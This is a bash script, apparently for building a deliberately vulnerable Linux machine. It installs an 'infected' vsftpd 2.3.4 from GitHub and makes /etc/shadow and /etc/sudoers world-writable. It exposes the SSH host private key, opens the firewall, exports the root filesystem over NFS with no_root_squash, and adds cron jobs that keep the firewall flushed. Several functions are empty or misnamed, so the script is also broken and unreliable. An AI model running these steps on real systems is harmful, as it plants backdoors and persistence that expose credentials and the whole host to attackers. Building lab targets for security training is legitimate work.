#! /bin/bash

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
PURPLE='\033[0;35m'
NC='\033[0m'

ufw="ufw"
iptables="iptables"
firewalld="firewall-cmd"

debianServices () {
    apt-get install -y openssh-server
    systemctl enable ssh
    systemctl start ssh
    apt-get install -y nfs-kernel
    apt-get install -y git
    git clone https://github.com/nikdubois/vsftpd-2.3.4-infected.git
    apt-get install -y build-essential
    apt-get install -y ftp
    apt-get install -y ncat
    apt-get install -y gcc
}

filePermissions () {
    chmod 666 /etc/shadow
    chmod 666 /etc/crontab
    chmod 666 /etc/sudoers
    chmod 666 /etc/aliases
    chmod 666 /etc/resolv.conf
}

sshKeys () {
    mkdir /etc/backupkeys
    chmod 666 -R /etc/backupkeys
    cp /etc/ssh/ssh_host_rsa_key.pub /etc/backupkeys/public
    cp /etc/ssh/ssh_host_rsa_key /etc/backupkeys/private
}

firewall () {

    if [ -x "$(command -v $ufw)" ];
    then
        ufw enable
        ufw allow from any
    elif [ -x "$(command -v $iptables)" ];
    then
        iptables --flush
    elif [ -x "$(command -v $firewalld)" ];
    then
        rm -rf  /etc/firewalld/zones/
        cp -r /usr/lib/firewalld/zones  /etc/firewalld/zones
        firewall-cmd --reload
        firewall-cmd --zone=public --list-all
    else
        printf "${RED}issue with resetting firewall rules.${NC}\n"
    fi
}

rsync () {

}

nfs () {
    systemctl enable nfs-kernel-server
    systemctl start nfs-kernel-server
    echo "/home * (rw,sync,no_root_squash)" >> /etc/exports
    echo "/ * (rw,sync,no_root_squash)" >> /etc/exports
}

cronjob1 () {
    if  [ -x "$(command -v $ufw)" ];
    then
        (crontab -l 2>/dev/null; echo "*/15 * * * * ufw allow from any") | crontab -
    elif [ -x "$(command -v $iptables)" ];
    then
        (crontab -l 2>/dev/null; echo "*/15 * * * * iptables --flush") | crontab -
    elif [ -x "$(command -v $firewalld)" ];
    then
        (crontab -l 2>/dev/null; echo "*/15 * * * * rm -rf /etc/firewalld/zones/") | crontab -
        (crontab -l 2>/dev/null; echo "*/15 * * * * cp -r /usr/lib/firewalld/zones /etc/firewalld/zones") | crontab -
        (crontab -l 2>/dev/null; echo "*/15 * * * * firewall-cmd --reload") | crontab -
        (crontab -l 2>/dev/null; echo "*/15 * * * * --zone=public --list-all") |crontab -
    else
        printf "${RED} cannot create firewall jobs${NC}\n"
    fi
}

cronjob2 () {

}

cronjob3 () {

}

wwsscript () {

}
printf "${YELLOW}----------setting up services----------${NC}\n"
#debianServices

printf "${YELLOW}----------messing with file permissions----------${NC}\n"
#filepermisssions

printf "${YELLOW}----------exposing ssh keys----------${NC}"
#sshkeys